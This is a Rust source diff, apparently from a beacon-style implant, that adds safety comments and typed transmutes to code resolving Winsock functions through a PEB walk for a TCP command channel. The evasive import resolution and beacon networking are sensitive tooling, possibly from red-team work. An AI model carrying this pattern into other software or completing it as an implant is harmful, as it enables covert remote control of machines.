@@ -163,6 +163,12 @@ struct SockaddrIn {
 // ws2_32 load + export resolution
 // ══════════════════════════════════════════════════════════════════════════════
 
+/// Force-load ws2_32.dll and resolve the Winsock function table once.
+/// Idempotent: the `WSA` static makes repeat calls no-ops.
+///
+/// # Safety
+/// Resolves OS function pointers via PEB walk + `LoadLibraryA` and installs
+/// them into a process-lifetime static; transmutes assume the Win32 x64 ABI.
 pub unsafe fn ensure_ws2_32() {
     use core::sync::atomic::Ordering;
     // Fast path: already attempted.
@@ -253,6 +259,9 @@ unsafe fn ensure_ws2_32_resolve() -> Option<alloc::boxed::Box<WsaFns>> {
 
 /// Build the Winsock function table from the 12 resolved export addresses
 /// (all non-null — the caller's `if let` already unwrapped them).
+// One address parameter per Winsock export, in the same order as the resolve
+// list above — packing them into a struct would only shuffle the arity.
+#[allow(clippy::too_many_arguments)]
 unsafe fn ensure_ws2_32_build_table(
     wsa_startup: usize,
     wsa_cleanup: usize,
@@ -268,18 +277,18 @@ unsafe fn ensure_ws2_32_build_table(
     wsa_get_last_error: usize,
 ) -> alloc::boxed::Box<WsaFns> {
     alloc::boxed::Box::new(WsaFns {
-        wsa_startup: core::mem::transmute(wsa_startup),
-        wsa_cleanup: core::mem::transmute(wsa_cleanup),
-        socket: core::mem::transmute(socket),
-        connect: core::mem::transmute(connect),
-        send: core::mem::transmute(send),
-        recv: core::mem::transmute(recv),
-        closesocket: core::mem::transmute(closesocket),
-        select: core::mem::transmute(select),
-        ioctlsocket: core::mem::transmute(ioctlsocket),
-        getsockopt: core::mem::transmute(getsockopt),
-        setsockopt: core::mem::transmute(setsockopt),
-        wsa_get_last_error: core::mem::transmute(wsa_get_last_error),
+        wsa_startup: core::mem::transmute::<usize, FnWSAStartup>(wsa_startup),
+        wsa_cleanup: core::mem::transmute::<usize, FnWSACleanup>(wsa_cleanup),
+        socket: core::mem::transmute::<usize, FnSocket>(socket),
+        connect: core::mem::transmute::<usize, FnConnect>(connect),
+        send: core::mem::transmute::<usize, FnSend>(send),
+        recv: core::mem::transmute::<usize, FnRecv>(recv),
+        closesocket: core::mem::transmute::<usize, FnClosesocket>(closesocket),
+        select: core::mem::transmute::<usize, FnSelect>(select),
+        ioctlsocket: core::mem::transmute::<usize, FnIoctlsocket>(ioctlsocket),
+        getsockopt: core::mem::transmute::<usize, FnGetsockopt>(getsockopt),
+        setsockopt: core::mem::transmute::<usize, FnSetsockopt>(setsockopt),
+        wsa_get_last_error: core::mem::transmute::<usize, FnWsaGetLastError>(wsa_get_last_error),
     })
 }
 
@@ -402,6 +411,10 @@ unsafe fn recv_exact(fns: &WsaFns, s: Socket, n: usize) -> Option<Vec<u8>> {
 ///
 /// Errors at any step → `None` (the beacon loop treats this as a channel failure
 /// and will retry / fall back).
+///
+/// # Safety
+/// Invokes Winsock function pointers resolved via PEB walk; `frame` must be a
+/// valid buffer and `ctx.tcp_peer_host` a dotted-decimal IPv4 string.
 pub unsafe fn send_recv(ctx: &ChannelCtx, frame: &[u8]) -> Option<Vec<u8>> {
     // ---- Validate configuration ----
     // Empty host or zero port ⇒ channel not configured. Distinct diag mark so a
